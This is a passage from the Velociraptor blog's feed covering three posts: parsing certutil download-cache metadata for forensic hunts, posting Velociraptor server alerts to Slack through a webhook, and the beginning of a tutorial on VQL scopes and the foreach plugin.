 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>The &lt;code>certutil&lt;/code> tool will download our executable and create a metadata file containing some very interesting data but what does it mean?&lt;/p>
&lt;p>






&lt;figure id="534bb2bebc97af0aaafd6a586ab6060a">
 &lt;div data-featherlight="#534bb2bebc97af0aaafd6a586ab6060a" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/13ZKzTgDOewJinIZPEk_5TQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Luckily &lt;code>Aalfaifi&lt;/code> has done the sleuthing work and their excellent article covers the details. I will interactively develop my VQL parser using the Velociraptor notebook. I first add a new notebook then add a VQL cell to it. I can now write and evaluate free form VQL.&lt;/p>
&lt;p>Let’s begin by just hard coding the path to the metadata file I created. I will also define a profile and an initial struct called Header.&lt;/p>
&lt;p>






&lt;figure id="bfed676f2597ca816fc08485b3a87f6d">
 &lt;div data-featherlight="#bfed676f2597ca816fc08485b3a87f6d" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/1Dr6MW-g3e7l_adVaf0ZpSw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="what-is-a-profile">What is a profile?&lt;/h3>
&lt;p>A profile is a data driven template that describes how the data is overlaid onto the binary file. Velociraptor uses the profile to drive the parser but the profile is also meant for human consumption — it simply describes all the structs and their fields, sizes etc. Profiles are designed to be succinct and quick to write but also easy to read and understand.&lt;/p>
&lt;p>The basic structure of a profile is a JSON encoded data structure:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>The Profile contains a list of struct definitions&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Each struct definition is a list of &lt;strong>[name, size, list of field definitions]&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Each field definition is a list of** [name, offset, type, options]**&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>I will start to define the Header struct with the following fields (offsets and fields taken from the Blog post above)&lt;/p>
&lt;ul>
&lt;li>
&lt;p>UrlSize is a 32 bit integer laid at offset 12&lt;/p>
&lt;/li>
&lt;li>
&lt;p>HashSize is a 32 bit integer laid at offset 100&lt;/p>
&lt;/li>
&lt;li>
&lt;p>DownloadTime is a 64 bit timestamp at offset 16&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>You can see the profile and the resulting object in the screenshot below. Velociraptor calls the parse_binary() VQL function which opens the file and parses the struct &lt;strong>Header&lt;/strong> at offset 0.&lt;/p>
&lt;p>






&lt;figure id="51d32885dfa59d250288659912eb2ae6">
 &lt;div data-featherlight="#51d32885dfa59d250288659912eb2ae6" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/1WsI7L2niMYLC_N08v-eP1g.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="dynamic-properties">Dynamic properties&lt;/h3>
&lt;p>So far things are simple — we specified the offsets and types of each field and Velociraptor just parsed them. However, now we want to extract the URL. According to the Blog post the URL starts at offset 116 and has a length specified by the UrlSize field. It is then followed by the hash with a length specified by the HashSize field.&lt;/p>
&lt;p>Because the offsets and sizes are not known in advance (URLs have different lengths), we need to define the profile dynamically. The profile will accept a &lt;strong>VQL lambda&lt;/strong> function in many places. The lambda function receives the partially parsed struct and can use it to derive other values dynamically at runtime.&lt;/p>
&lt;p>We can specify the URL as being a &lt;strong>String&lt;/strong> type with a length determined dynamically by the &lt;strong>x.UrlSize&lt;/strong> field. Similarly we can declare the offset of the Hash field as the lambda &lt;strong>x=&amp;gt;x.UrlSize + 116&lt;/strong>&lt;/p>
&lt;p>






&lt;figure id="b252eb2996e8a43fdb700ac71dd68523">
 &lt;div data-featherlight="#b252eb2996e8a43fdb700ac71dd68523" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/1HZ7HGESjXWLR3DfapFOAxA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>






&lt;figure id="c588823a62fb8137c9d3058390a9c0f9">
 &lt;div data-featherlight="#c588823a62fb8137c9d3058390a9c0f9" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/1S3LmbPVR8HpY1dgojr1kxA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="putting-it-all-together">Putting it all together&lt;/h3>
&lt;p>This was easy! We now know the url the &lt;code>certutil&lt;/code> tool downloaded
from, the hash and the timestamp — all are critical in a DFIR
investigation to distinguish the legitimate use of &lt;code>certutil&lt;/code> from
malicious.&lt;/p>
&lt;p>While the above VQL only parsed a single hard coded metadata file, in practice we want to search for all metadata files from all users and parse them in a single collection.&lt;/p>
&lt;p>You can see the full artifact here &lt;a href="https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Forensics/CertUtil.yaml" target="_blank" >https://github.com/Velocidex/velociraptor/blob/master/artifacts/definitions/Windows/Forensics/CertUtil.yaml&lt;/a>
 including extra functionality like filtering out whitelisted domains, and an option to also fetch the downloaded file from the &lt;strong>CryptUrlCache&lt;/strong>&lt;/p>
&lt;h3 id="collecting-the-new-artifact">Collecting the new &lt;strong>artifact&lt;/strong>&lt;/h3>
&lt;p>I will now collect the artifact from my endpoint. Using the GUI, I click the &lt;strong>add new collection&lt;/strong> button, then search for my &lt;strong>Windows.Forensics.CertUtil&lt;/strong> artifact.&lt;/p>
&lt;p>






&lt;figure id="d68d751d3ebefce5389c61b97e4d8295">
 &lt;div data-featherlight="#d68d751d3ebefce5389c61b97e4d8295" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/1j1yRTbk4mFoWNPBWKHHevA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Now I can configure the whitelist and possibly also choose to download the cached files.&lt;/p>
&lt;p>






&lt;figure id="6e3f4bc5836636bd72436d770322d948">
 &lt;div data-featherlight="#6e3f4bc5836636bd72436d770322d948" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/1djMNYeKuRJ5xISGh7ssg9Q.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>The files are parsed on the endpoint and we see the relevant information in seconds&lt;/p>
&lt;p>






&lt;figure id="59c469e0d439093aa5f32a0e76048cef">
 &lt;div data-featherlight="#59c469e0d439093aa5f32a0e76048cef" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-01-19-parsing-binary-files-d31114a41f14/../../img/1W9X8wH91FoezNlOk4gXzuA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Doing a hunt across all my endpoints will now tell me if &lt;code>certutil&lt;/code> was ever used to download a suspicious tool, from where, and potentially uploading the tool itself in the &lt;strong>CryptUrlCache&lt;/strong>.&lt;/p>
&lt;h3 id="conclusions">Conclusions&lt;/h3>
&lt;p>Although this was a simple example, the binary parser is extremely capable. Some other examples include &lt;strong>Windows.System.Powershell.ModuleAnalysisCache&lt;/strong> (parses the powershell module analysis cache) and &lt;strong>Windows.Forensic.Lnk&lt;/strong> (Parse link files) and many more.&lt;/p>
&lt;p>Being able to go from reading an analysis in a blog post to running a hunt across your entire network in a matter of minutes is a truly powerful capability, allowing our DFIR team to be proactive and innovative. Having a powerful binary parser in your toolbox is a real bonus making many types of hunts possible.&lt;/p>
&lt;p>If you are interested in learning more about Velociraptor, check out our hands on training courses on &lt;a href="https://www.velocidex.com/training/" target="_blank" >https://www.velocidex.com/training/&lt;/a>
 or join us on discord &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
.&lt;/p></description></item><item><title>Slack and Velociraptor</title><link>https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/</link><pubDate>Sat, 26 Dec 2020 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/</guid><description>&lt;p>






&lt;figure id="138a75c2386a459fcc1ca2f2c2ed4214">
 &lt;div data-featherlight="#138a75c2386a459fcc1ca2f2c2ed4214" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/https://cdn-images-1.medium.com/max/12030/0*bkglpXK2FLycHuia?width=600px" alt="Photo by Joan Gamell on Unsplash" />
 &lt;/div>
 &lt;figcaption>
 Photo by Joan Gamell on Unsplash
 &lt;/figcaption>
&lt;/figure>


&lt;em>Photo by &lt;a href="https://unsplash.com/@gamell?utm_source=medium&amp;amp;utm_medium=referral" target="_blank" >Joan Gamell&lt;/a>
 on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral" target="_blank" >Unsplash&lt;/a>
&lt;/em>&lt;/p>
&lt;p>You might have heard of &lt;a href="https://slack.com/" target="_blank" >Slack&lt;/a>
 — a chatting app that has grown in popularity over the past few years. Slack allows for API access to the the workspaces, which opens the door to novel applications and automation.&lt;/p>
&lt;p>In this blog post I will demonstrate how to connect Slack to Velociraptor, and be notified within a Slack channel of various events that happen on your Velociraptor deployment.&lt;/p>
&lt;h3 id="creating-a-slack-app">Creating a Slack App&lt;/h3>
&lt;p>The first thing I will do is create a Slack channel to receives messages from Velociraptor. This keeps Velociraptor messages separate and I can subscribe a small number of users within my Slack workspace to that channel.&lt;/p>
&lt;p>I will create a new channel called “alerts”&lt;/p>
&lt;p>Next I will create an App which will communicate with the workspace and be able to post messages to the alerts channel. (This &lt;a href="https://api.slack.com/start/overview#creating" target="_blank" >reference &lt;/a>
has a lot of details on this step, which I will just skip but you should consult it for your own use). First I visit the slack API page at &lt;a href="../../img/apps" >https://api.slack.com/apps&lt;/a>
&lt;/p>
&lt;p>






&lt;figure id="f673d3ae662a8dc688d5e6d32b2c615d">
 &lt;div data-featherlight="#f673d3ae662a8dc688d5e6d32b2c615d" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/14J5S4V0jlkVLvFKI3SaeUA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Next I will create an app called “Velociraptor” that will be able to push messages to my workspace.&lt;/p>
&lt;p>






&lt;figure id="8523eb88069f5a874299c11e42055226">
 &lt;div data-featherlight="#8523eb88069f5a874299c11e42055226" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/19RCHElLgfXOSdioPqfE28g.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Since I just want Velociraptor to inform me about events, it really only needs to push messages. I will therefore select the “Incoming Webhooks” app type.&lt;/p>
&lt;p>






&lt;figure id="4ba896bc7b237e7fae9a8866c33461a7">
 &lt;div data-featherlight="#4ba896bc7b237e7fae9a8866c33461a7" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1hzeftjwj-ItD5h_H_eE62g.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Enable the webhook by sliding the option to on&lt;/p>
&lt;p>






&lt;figure id="774141a31dd9b2de4989815d998be8d6">
 &lt;div data-featherlight="#774141a31dd9b2de4989815d998be8d6" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1EVMLGulrWcrmJfhHb9hRUA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Webhooks are simply HTTP REST APIs which can be used by any software to post to the channel providing they have a special secret called a “Token”. I can add a new webhook to my workspace on this page&lt;/p>
&lt;p>






&lt;figure id="c1bf95b00a383fc4b0f22852af081d28">
 &lt;div data-featherlight="#c1bf95b00a383fc4b0f22852af081d28" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1WWBAXXo9zmQ4WFkeSvuhLQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>I now allow the webhook to post to the alerts channel&lt;/p>
&lt;p>






&lt;figure id="0c2e05ecedd9de8ed5a2e113e9e994b0">
 &lt;div data-featherlight="#0c2e05ecedd9de8ed5a2e113e9e994b0" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1uAS5ZvGflIp_-zl2STlYpg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Posting the message is a very simple HTTP request — Slack even shows an example using curl&lt;/p>
&lt;p>






&lt;figure id="e6643f40634ec6fd62388abb258fc995">
 &lt;div data-featherlight="#e6643f40634ec6fd62388abb258fc995" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1mubZvdsnaLV-fB_tfQpQNw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>The curl command line indicates that the request:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Needs to be using the POST method&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Needs to have a content type of &lt;em>application/json&lt;/em>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Needs to POST a JSON encoded object with a key called “text” which contains the message text.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="posting-a-message-from-velociraptor">Posting a message from Velociraptor&lt;/h3>
&lt;p>Next I will test my new webhook by writing a quick VQL query in a Velociraptor notebook. I like to develop my VQL in a notebook, since that allows me to easily iterate over my query. Going to my Velociraptor console, I add a new notebook and add a VQL cell.&lt;/p>
&lt;p>






&lt;figure id="dd0dc79390c1ef7336d6e8fd98a8de47">
 &lt;div data-featherlight="#dd0dc79390c1ef7336d6e8fd98a8de47" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1GBkeEP6PTZnNttmw1B_Q1A.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Here I am just replicating the curl command line above using VQL’s http_client plugin. Once I save the cell, Velociraptor will make an API request to the slack servers and my message will appear in the alerts channel.&lt;/p>
&lt;p>






&lt;figure id="a10992c21c370c5bf09de82b194db7d7">
 &lt;div data-featherlight="#a10992c21c370c5bf09de82b194db7d7" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/12QiKAIh7vZ0A9Xe9y3rtOg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="alerting-on-events">Alerting on events&lt;/h3>
&lt;p>Sending messages to Slack is pretty cool, but we really want to know when interesting stuff happens in response to events. One interesting use case that people always ask me about is to alert when a particular machine comes back online so it can be interactively investigated.&lt;/p>
&lt;p>From a usability perspective, I want to tell the server to monitor a number of endpoints, and then when each comes back online, send a Slack message and stop monitoring that system.&lt;/p>
&lt;p>Whenever I have a set of machines that we want to operate on, I think of client labels. In Velociraptor, we can attach any number of labels to a client, and then search for all machines that have the label efficiently (this effectively creates a group of machines).&lt;/p>
&lt;p>I will add the label “Slack” to my test machine by simply selecting it in the client search page and clicking the “Add Label” button.&lt;/p>
&lt;p>






&lt;figure id="e16e4b88f0303decd161e1e9bdadabdd">
 &lt;div data-featherlight="#e16e4b88f0303decd161e1e9bdadabdd" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1uKNwvvn723Ygr_STiMwsNg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Going back to my notebook, I am ready to develop this VQL query step by step.&lt;/p>
&lt;h3 id="step-1-is-the-client-online-now">Step 1: Is the client online now?&lt;/h3>
&lt;p>The first query I will write will return all the clients in the &lt;strong>“Slack”&lt;/strong> label group, and show how many seconds ago they were online.&lt;/p>
&lt;p>






&lt;figure id="233ab43f5db6be78bc8fd0b81e9b44d6">
 &lt;div data-featherlight="#233ab43f5db6be78bc8fd0b81e9b44d6" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1wCX-kCRmOvkUZcgHYj3_ug.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>I am using the now() VQL function to return the number of seconds since the epoch. The client’s &lt;strong>last_seen_at&lt;/strong> time is given as microseconds since the epoch so I quickly convert it to seconds.&lt;/p>
&lt;p>I can quickly retrieve the clients in the &lt;strong>“Slack”&lt;/strong> label group by using the clients() plugin and applying a search expression “label:Slack”. Note that searching the clients by label in this way is much more efficient since it uses the label index rather than a row scan over all clients.&lt;/p>
&lt;h3 id="step-2-alert-for-recently-seen-clients">Step 2: Alert for recently seen clients&lt;/h3>
&lt;p>The next step is to send a Slack message for all clients which have been seen recently (say in the last 5 minutes).&lt;/p>
&lt;p>






&lt;figure id="59917eb381384393733c2c7d9a3a73f3">
 &lt;div data-featherlight="#59917eb381384393733c2c7d9a3a73f3" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/124ZL5EICiE_pZYKfTlPj7w.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>I add a WHERE Condition to the previous query, then for each client, I re-use my earlier Slack query to post a message informing me which client is online.&lt;/p>
&lt;p>






&lt;figure id="078d39e4a43e2a4b5971c4a15b5e4ea7">
 &lt;div data-featherlight="#078d39e4a43e2a4b5971c4a15b5e4ea7" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1eKxlzgJgqGbbpIBDCYgTLQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="step-3-removing-the-client-from-the-watchlist">Step 3: Removing the client from the watchlist&lt;/h3>
&lt;p>Once I sent a slack alert for this client, I do not want to check it again. Let’s modify the above query to remove the label as well.&lt;/p>
&lt;p>






&lt;figure id="66aca4b04718deff9bda5b4b9041ad80">
 &lt;div data-featherlight="#66aca4b04718deff9bda5b4b9041ad80" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/19a5wyFGxAik1oa1I8Qe4Uw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="step-4-creating-a-monitoring-artifact">Step 4: Creating a monitoring artifact&lt;/h3>
&lt;p>We previously saw how I can check for clients and send slack messages in the notebook. While this is fun and helps to develop VQL, in order to actually run this, we need to have the server monitoring for new clients all the time — in other words we need a Monitoring (Or Events) Artifact.&lt;/p>
&lt;p>The previous query just ran once and stopped, but I really want to run it continuously every minute say. I do this by running the previous query periodically using the &lt;strong>clock()&lt;/strong> plugin.&lt;/p>
&lt;p>I go to the “View Artifacts” sidebar and then click the “Add an artifact” button.&lt;/p>
&lt;p>






&lt;figure id="00df77cdf4c1186f08d856892c2c72b1">
 &lt;div data-featherlight="#00df77cdf4c1186f08d856892c2c72b1" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1ZKfuzpZHTGCd3b2mOEcGPg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>The two main differences here are that this is a SERVER_EVENT artifact — i.e. it is running on the server continuously. I then use the clock() plugin to trigger the previous query to run every minute and scan for new clients coming online (line 27: &lt;strong>foreach&lt;/strong> &lt;strong>clock&lt;/strong> event, run the &lt;strong>send_message&lt;/strong> query).&lt;/p>
&lt;h3 id="step-5-install-the-artifact">Step 5: Install the artifact&lt;/h3>
&lt;p>To install the artifact on the server, I will go to the Server Monitoring screen, and add it in the search view by clicking the “update server monitoring table” toolbar button.&lt;/p>
&lt;p>






&lt;figure id="9bda443790a888640f018a7413471364">
 &lt;div data-featherlight="#9bda443790a888640f018a7413471364" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1nsoI3t2io_Ww8gbCxptniw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Now I can add the label to any client I am interested in and within a minute of it coming back online I will receive an alert in my slack channel&lt;/p>
&lt;p>






&lt;figure id="39af799a607bfa2bdbaebab628943b40">
 &lt;div data-featherlight="#39af799a607bfa2bdbaebab628943b40" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/../../img/1_RuYRGYKlwA7VeMkExYcyA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="conclusions">Conclusions&lt;/h3>
&lt;p>In this post we saw how to make outbound REST API calls from the Velociraptor server using VQL. The example of Slack integration is a great use case for such an artifact, but there are many systems using HTTP style APIs (RESTfull or not) to be able to receive information from Velociraptor.&lt;/p>
&lt;p>We saw how VQL can be written to run a continuous monitoring query on the server, checking for a condition that we are interested in. You could probably think of many examples of events that you will want to be notified of in a similar way (e.g. psexec used on any endpoint can be detected in near real time and escalated automatically to a Slack channel, or getting notified when a critical domain account is used anywhere on the network).&lt;/p>
&lt;p>Escalating to Slack is suitable for fairly low frequency but high value events. If there are too many events, the channel will be too noisy and not useful (people will just mute it), so consider how frequently the alert will be fired, and how you intend to deal with it.&lt;/p>
&lt;p>To play with this feature yourself, take&lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" > Velociraptor for a spin&lt;/a>
! It is a available on GitHub under an open source license. If you want to learn more about VQL and Velociraptor consider joining us on one of our &lt;a href="https://www.velocidex.com/training/" target="_blank" >upcoming training sessions&lt;/a>
.&lt;/p>
&lt;p>As always please file issues on the bug tracker or ask questions on our mailing list &lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>
 . You can also chat with us directly on discord &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
&lt;/p></description></item><item><title>The Velociraptor Query Language Pt 2</title><link>https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/</link><pubDate>Fri, 19 Jun 2020 00:38:44 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/</guid><description>&lt;p>






&lt;figure id="29078a514957f5f75e16ecdb1458333e">
 &lt;div data-featherlight="#29078a514957f5f75e16ecdb1458333e" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/../../img/0rLy01O0JHT3Kp57q.jpg" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>In our previous article I introduced the basics of the Velociraptor Query Language (VQL). We have learned the basic structure of VQL is similar to the SQL SELECT statement&lt;/p>
&lt;p>






&lt;figure id="faee8e3b8a86974f9178205889faad35">
 &lt;div data-featherlight="#faee8e3b8a86974f9178205889faad35" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/../../img/06-m6txTbGOzeIqrJ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>However, one of the main differences between SQL and VQL is that VQL’s data sources are not simple data tables, but are instead executable code termed “plugins”. VQL plugins are simply generators of rows, and may take a number of named arguments.&lt;/p>
&lt;h3 id="the-scope">The scope&lt;/h3>
&lt;p>Just like most other programming languages, VQL has a concept of a scope. You can think of the scope as a bag of names referring to values. When VQL encounters a symbol reference within in the query, the VQL engine will consult the scope at that point and try to resolve the symbol’s name for an actual object.&lt;/p>
&lt;p>For example consider the following simple query&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT * FROM info()
&lt;/code>&lt;/pre>
&lt;p>When VQL encounters the symbol “&lt;strong>info&lt;/strong>” it looks at the scope object used to evaluate the query, for a plugin with that name. If there is such a plugin, VQL will call it and extract rows from it.&lt;/p>
&lt;p>Scopes can also be nested — a scope is not one simple dictionary, instead it is a stack of dictionaries. Looking up a name in the scope walks the scope stack in reverse order (from inner scope to outer scope) looking for a match.&lt;/p>
&lt;p>






&lt;figure id="bac3645f6cf4280cb818b8eec549f43f">
 &lt;div data-featherlight="#bac3645f6cf4280cb818b8eec549f43f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/../../img/1IXt3ZEGZDVlbk1nUGQYQVw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Consider the above query SELECT OS FROM info(). The query begins with a parent scope and then VQL will run the info() plugin. The plugin will emits a row containing information about the platform. VQL will then create a nested subscope appending the row to the parent scope, and propagate the row further in the query.&lt;/p>
&lt;p>The column selector in this query refers to the symbol &lt;strong>OS&lt;/strong>. In order to resolve this symbol, VQL will walk the nested scope in reverse and will find a column called OS in the row. This will resolve the name and end the search, causing the OS to be emitted into the result set.&lt;/p>
&lt;p>Lets crank it up a bit — what if we refer to an unknown symbol?&lt;/p>
&lt;p>






&lt;figure id="3f10e31ec07e971472486290e69fe737">
 &lt;div data-featherlight="#3f10e31ec07e971472486290e69fe737" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/../../img/14NKhmecY8Wu2GTxDcfVn1g.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>In the above query SELECT OS, Foo FROM info() we refer to an unknown symbol called &lt;strong>Foo&lt;/strong>. VQL will attempt to resolve this symbol by walking the scope stack as before, but since the symbol is not known this will fail.&lt;/p>
&lt;p>VQL emits a warning that Symbol Foo is not found and helpfully prints the current scope at the point of resolution. As you can see from the warning message, the scope consists of a list of layers, each layer has a set of columns. This is why we refer to the scope as a scope stack.&lt;/p>
&lt;p>The last element in the scope stack is the row produced by the info() plugin. (As can be seen by the usual columns emitted by info() including an OS column).&lt;/p>
&lt;p>Note that VQL emits a warning but the query keeps going — most errors in VQL are “soft” errors that do not terminate the query from running. VQL does its best to continue with query execution as much as possible.&lt;/p>
&lt;h3 id="the-foreach-plugin-and-looping">The foreach plugin and looping&lt;/h3>
&lt;p>The previous section covered the query scope in what seems like a rather theoretical and very computer science manner — why should you care about it? The concept of scope is central to VQL and it is critical to understanding how data moves throughout the query.&lt;/p>
&lt;p>Consider the example of the foreach() plugin. Unlike SQL, VQL does not support joins. Instead, VQL provides a plugin to enable data from two different data sources to be combined.&lt;/p>
&lt;p>In VQL plugins accept named arguments, but the arguments do not have to be simple types like integers or strings. It is also possible to provide a subquery as an argument to a plugin. The foreach() plugin takes advantage of this property by accepting a &lt;strong>row&lt;/strong> query and a &lt;strong>query&lt;/strong> query. For each row emitted by the &lt;strong>row&lt;/strong> query, the foreach() plugin executes the query provided in the &lt;strong>query&lt;/strong> argument. This is illustrated in the diagram below.&lt;/p>
&lt;p>






&lt;figure id="590913cf284c93140b387699c2ac3a44">
 &lt;div data-featherlight="#590913cf284c93140b387699c2ac3a44" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/../../img/1EMA7RdO2bH0ZBoS3EPTP9A.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>How can we use this in practice? Consider the following example…&lt;/p>
&lt;p>






&lt;figure id="d1a87373ee59ef612afcec7ff2b7a690">
 &lt;div data-featherlight="#d1a87373ee59ef612afcec7ff2b7a690" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/../../img/1XgdBwQdDL4VHhJAWJGsFEw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
